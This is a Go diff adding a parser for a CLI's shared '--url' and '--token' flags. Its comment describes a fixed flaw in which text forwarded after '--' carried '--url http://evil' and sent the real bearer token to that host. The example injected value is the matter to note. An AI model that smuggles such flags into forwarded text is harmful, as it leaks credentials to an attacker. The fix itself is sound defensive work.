@@ -59,3 +59,55 @@ func parseArgs(args []string, known []string) (parsed, error) {
 	}
 	return out, nil
 }
+
+// The two flags every command shares. They are taken off argv before a
+// command sees it, so they need the same "--" rule as parseArgs — and for
+// the same reason, only worse: these two name the server and carry the
+// bearer token.
+//
+// The scan used to run over EVERY argument and knew nothing about "--", so
+// `moshi send ops -- $MSG` with a message that contained "--url http://evil"
+// sent the real token to that host, printed "✓ Sent to ops" and exited 0.
+// "--token" the same way, under an identity the sender did not choose. A
+// wrapper that forwards words it did not write — a ticket body, a log line,
+// an agent relaying text — was enough.
+//
+// Everything from "--" on is handed to the command untouched, including the
+// "--" itself: parseArgs strips it there.
+type globals struct {
+	url   string
+	token string
+	rest  []string
+}
+
+func parseGlobals(args []string, envToken string) (globals, error) {
+	out := globals{token: envToken}
+	for i := 0; i < len(args); i++ {
+		a := args[i]
+		if a == "--" {
+			out.rest = append(out.rest, args[i:]...)
+			return out, nil
+		}
+		key, val, eq := strings.Cut(a, "=")
+		if key != "--url" && key != "--token" {
+			out.rest = append(out.rest, a)
+			continue
+		}
+		if !eq {
+			if i+1 >= len(args) {
+				if key == "--url" {
+					return globals{}, fmt.Errorf("--url needs a value, e.g. --url https://mesh.example.com")
+				}
+				return globals{}, fmt.Errorf("--token needs a value, e.g. --token bt_...")
+			}
+			val = args[i+1]
+			i++
+		}
+		if key == "--url" {
+			out.url = val
+		} else {
+			out.token = val
+		}
+	}
+	return out, nil
+}
